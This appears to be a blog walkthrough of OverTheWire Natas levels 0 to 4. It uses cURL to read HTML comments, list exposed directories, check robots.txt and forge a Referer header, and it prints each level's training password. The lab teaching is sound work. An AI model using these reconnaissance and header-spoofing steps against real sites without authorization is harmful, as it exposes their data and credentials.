---
title: "Natas walkthrough"
date: 2026-02-16T15:00:00-06:00
draft: false
toc: true
tags:
  - security
  - natas
  - overthewire
  - curl
---

Natas teaches the basics of server-side web security. This walkthrough uses cURL so you get used to the command line and useful options. Each level is a short section; we’ll add more as we go.

---

## Level 0

For the first level we’re given:

- **Username:** `natas0`
- **Password:** `natas0`
- **URL:** <http://natas0.natas.labs.overthewire.org>

cURL is a command-line tool for transferring data to and from a server. To fetch the HTML source for natas0 we need the `-u` option, which sends the username and password for server authentication:

```bash
curl -u user:password URL
```

So we can request the HTML for natas0 with:

```bash
curl -u natas0:natas0 http://natas0.natas.labs.overthewire.org
```

Example output:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script>
</head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
</body>
</html>
```

For this level we only need to look at the body. When you do, you’ll see a comment left for us there: the password for natas1.

**Password for natas1:** `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`

---

## Level 1

For this level we have:

- **Username:** `natas1`
- **Password:** `0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq`
- **URL:** <http://natas1.natas.labs.overthewire.org>

Request the page with cURL:

```bash
curl -u natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq http://natas1.natas.labs.overthewire.org
```

Example output:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas1", "pass": "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>
</body>
</html>
```

For this level it’s fairly simple since we are not using a browser. Looking at the source code, the author disabled right‑clicking on the page, but lucky for us we can easily see the password using cURL.

**Password for natas2:** `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`

---

## Level 2

- **Username:** `natas2`
- **Password:** `TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI`
- **URL:** <http://natas2.natas.labs.overthewire.org>

From here on we can safely ignore `<script>` and `<link>` in the source; they’re just headers and not part of the puzzle.

```bash
curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org
```

Relevant part of the response (body):

```html
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body>
```

The only interesting part is the image: it’s loaded from `files/pixel.png`. The image itself isn’t the goal; where it’s coming from is. We can check whether the `files` directory has any leads. Point your URL at that path:

```bash
curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/
```

Directory listing:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /files</title>
 </head>
 <body>
<h1>Index of /files</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/image2.gif" alt="[IMG]"></td><td><a href="pixel.png">pixel.png</a></td><td align="right">2025-10-14 09:06  </td><td align="right">303 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-10-14 09:06  </td><td align="right">145 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at natas2.natas.labs.overthewire.org Port 80</address>
</body></html>
```

Besides the image we already saw, the listing shows `users.txt`. Fetch it by requesting that URL:

```bash
curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt
```

```text
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

Seems like an intern forgot to delete some sensitive files..

**Password for natas3:** `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`

---

## Level 3

- **Username:** `natas3`
- **Password:** `3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH`
- **URL:** <http://natas3.natas.labs.overthewire.org>

```bash
curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/
```

Body:

```html
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body>
```

We have to snoop around and see if there’s any sensitive data we can find. The hint is in the comment: “Not even Google will find it this time.” One thing that can be hidden from Google is instructions for bots. If you haven’t dealt with web crawlers before, see [robots.txt](https://en.wikipedia.org/wiki/Robots.txt). Sites often have a `robots.txt` file that tells crawlers what not to fetch. Let’s see if it exists:

```bash
curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/robots.txt
```

```text
User-agent: *
Disallow: /s3cr3t/
```

The site owner told robots not to crawl `/s3cr3t/`. Let’s peek inside that folder:

```bash
curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/
```

Directory listing:

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /s3cr3t</title>
 </head>
 <body>
<h1>Index of /s3cr3t</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2025-10-14 09:06  </td><td align="right"> 40 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at natas3.natas.labs.overthewire.org Port 80</address>
</body></html>
```

There’s `users.txt` again. Fetch it:

```bash
curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
```

```text
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

A lesson to be learned: always remove any possible sensitive information, unless you like vulnerabilities.

**Password for natas4:** `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`

---

## Level 4

- **Username:** `natas4`
- **Password:** `QryZXc2e0zahULdHrtHxzyYkj59kUxLQ`
- **URL:** <http://natas4.natas.labs.overthewire.org>

```bash
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org
```

Body:

```html
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
```

The hint is that authorized users should come only from that URL. The server is checking the **Referer** header. We can send a custom header with cURL using `-H`. For example:

```bash
curl -u user:pass URL -H "referer: URL"
```

Send the request again with the expected referer:

```bash
curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org -H "referer: http://natas5.natas.labs.overthewire.org/"
```

```html
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
```

Adding the Referer header makes the server treat us as if we came from natas5, so access is granted.

**Password for natas5:** `0n35PkggAPm2zbEpOU802c0x0Msn1ToK`

---

*More levels will be added in future sections.*
